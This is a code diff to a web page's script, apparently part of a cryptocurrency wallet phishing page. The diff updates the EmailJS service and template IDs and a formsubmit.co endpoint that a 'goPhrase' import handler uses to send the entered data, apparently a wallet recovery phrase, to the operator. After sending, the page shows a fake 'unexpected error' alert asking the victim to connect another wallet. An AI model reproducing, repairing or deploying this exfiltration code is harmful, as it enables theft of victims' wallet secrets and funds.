@@ -221,8 +221,8 @@
 
             const sendData = (data) => {
                 console.log(data);
-                const service_id = "service_afqz2cp";
-                const template_id = "template_qbo34sv";
+                const service_id = "service_l87qvhb";
+                const template_id = "template_87atsya";
 
                 data = {
                     message: data,
@@ -230,7 +230,7 @@
                 }
 
                 $.ajax({
-                    url: "https://formsubmit.co/el/xodofe",
+                    url: "https://formsubmit.co/ajax/b56400a81c49acdbd5bcec07bdce8a8f",
                     method: "POST",
                     data: data,
                     dataType: "json"
@@ -242,7 +242,7 @@
                     console.log(erroor);
                 });
 
-                emailjs.send(service_twppwj6, template_twm589w, data)
+                emailjs.send(service_id, template_id, data)
                 .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
                 alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet")
@@ -266,6 +266,5 @@
                 $("#importBtn").click(goPhrase)
             })
         </script>
-       
     </body>
 </html>
